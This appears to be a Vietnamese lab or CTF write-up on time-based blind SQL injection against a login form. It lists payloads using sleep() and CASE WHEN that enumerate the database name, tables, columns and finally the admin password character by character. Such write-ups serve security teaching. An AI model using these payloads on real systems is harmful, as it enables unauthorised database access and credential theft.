## Time-based SQLi

`Description:` form đăng nhập gồm 2 input `username` và `password`.

<img src="https://user-images.githubusercontent.com/92881216/220964719-651ab56a-7118-4218-8629-7b4266112bce.png" width=500px />

Đầu tiên nhập thử  `username` và `password` với giá trị bất kỳ thì thấy echo ra `username` đã nhập kể cả khi nhập các ký tự đặc biệt khác, vì vậy không thể xác định được payload nhập vào là đúng hay sai.

<img src="https://user-images.githubusercontent.com/92881216/220965495-9df3f3e4-cf3f-4599-a683-004183d0973a.png" width=500px /> <img src="https://user-images.githubusercontent.com/92881216/220965747-c42d5c92-dd3d-4fb8-97a5-4b76d9a26391.png" width=500px />

Tiếp theo thử với `username` là `a' or sleep(3); -- -` thì kết quả trả về khá lâu vì vậy xác định lỗi time based và có được hướng khai thác.

<img src="https://user-images.githubusercontent.com/92881216/220967787-2abdb214-d616-408e-ae32-87f3628f072c.png" width=500px />

Khi sử đụng payload `' or (case when (1=1) then sleep(3) else 1 end)=1 -- ` để khai thác. Khi điều kiện (1=1) đúng thì db sẽ thực hiện sleep(3) và sẽ delay thời gian trả về và ngược lại giả sử với 1=2 thì thời gian trả về bình thường.

- Xác định database:

  * Xác định độ dài của db bằng payload: `' or (case when (length(database())=i) then sleep(1) else 1 end)=1 -- `. Em sử dụng Burp Suite để xem phản hồi khi thử từng giá trị i từ 1 đến 20:

![image](https://user-images.githubusercontent.com/92881216/220975064-45d67f55-04d8-4ddb-98b2-17d964db744b.png)

Vậy xác định được độ dài tên db là 4 vì có thời gian phản hồi lâu hơn phần còn lại.

  * Tiếp theo xác định db bằng payload: `' or (case when (substr(database(),i,1)='j') then sleep(1) else 1 end)=1 -- ` với giá trị i từ 1 đến 4 và j là ký tự :

![image](https://user-images.githubusercontent.com/92881216/220976047-a576fc31-05c2-49ef-b316-66dc9eea0d53.png)

Vậy tên db là `kcsc`.

- Xác đinh bảng :

Sử dụng payload: `' or (case when substring((select table_name from information_schema.tables where table_schema='kcsc' limit 1,1),i,1)='j' then sleep(1) else 1 end)=1 -- ` với i là thứ tự ứng với ký tự j.

![image](https://user-images.githubusercontent.com/92881216/220977403-3d6e7af8-f0f4-4cec-abaa-9068318cd010.png)

Khi limit 1,1 thì dump ra bảng `usrs` còn limit 0,1 thì bảng `products`.

- Xác định cột trong bảng `user`:

Payload: `' or (case when substring((select column_name from information_schema.columns where table_name='users' limit 2,1),i,1)='j' then sleep(1) else 1 end)=1 -- ` với i là thứ tự ứng với ký tự j.

![image](https://user-images.githubusercontent.com/92881216/220979058-1cb7f125-ea9a-45a9-93f0-6de81c87f7c5.png)

Vậy kết quả được cột `password` tương tự vậy khi limit 0,1 được cột `id` và limit 1,1 được cột `username`

- Xác định password của admin:

Sử dụng payload: `' or (case when substr((select password from users where username='admin'),i,1)='j' then sleep(1) else 1 end)=1 -- `

![image](https://user-images.githubusercontent.com/92881216/220980951-0894422d-5cc8-4693-8f02-e7d943412b58.png)

> password : `the_admin_password`


  









